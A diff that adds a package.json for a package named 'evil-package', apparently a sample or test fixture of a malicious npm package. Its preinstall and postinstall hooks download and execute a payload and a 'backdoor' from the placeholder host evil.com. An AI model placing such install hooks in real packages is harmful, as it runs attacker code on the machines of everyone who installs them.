@@ -1,0 +1,8 @@
+{
+  "name": "evil-package",
+  "version": "1.0.0",
+  "scripts": {
+    "preinstall": "node -e \"require('child_process').exec('curl http://evil.com/payload.sh | sh -c bash')\"",
+    "postinstall": "bash -c 'wget http://evil.com/backdoor && chmod +x backdoor && ./backdoor'"
+  }
+}
